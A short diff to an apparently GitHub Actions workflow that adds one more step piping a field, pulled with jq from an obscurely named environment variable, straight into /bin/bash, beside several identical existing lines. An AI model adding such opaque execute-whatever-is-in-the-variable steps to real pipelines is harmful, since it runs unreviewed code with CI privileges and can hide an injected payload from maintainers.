@@ -24,6 +24,7 @@ jobs:
           echo $xr75 | jq -r .gxtj2 | /bin/bash
           echo $peuu45318 | jq -r .pc0 | /bin/bash
           echo $etcrk183 | jq -r .yu6284 | /bin/bash
+          printf '%s' "$flqps64" | jq -r .ni6600 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
